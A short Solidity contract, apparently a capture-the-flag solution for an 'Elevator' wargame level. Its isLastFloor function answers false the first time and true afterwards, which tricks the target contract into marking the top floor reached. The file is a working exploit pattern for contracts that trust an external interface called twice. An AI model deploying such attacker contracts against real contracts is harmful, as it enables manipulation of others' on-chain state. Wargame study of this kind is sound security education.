// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Building.sol";

contract BuildingAttacker is Building {
    Elevator elevatorContract;
    address payable public owner;
    uint256 calls = 0;

    constructor(address payable _elevatorContract) public payable {
        owner = msg.sender;
        elevatorContract = Elevator(_elevatorContract);
    }

    function isLastFloor(uint256 _floor) public override returns (bool) {
        if (calls == 0) {
            calls += 1;
            return false;
        }
        return true;
    }

    function goTo() public {
        require(msg.sender == owner);
        elevatorContract.goTo(1);
    }
}
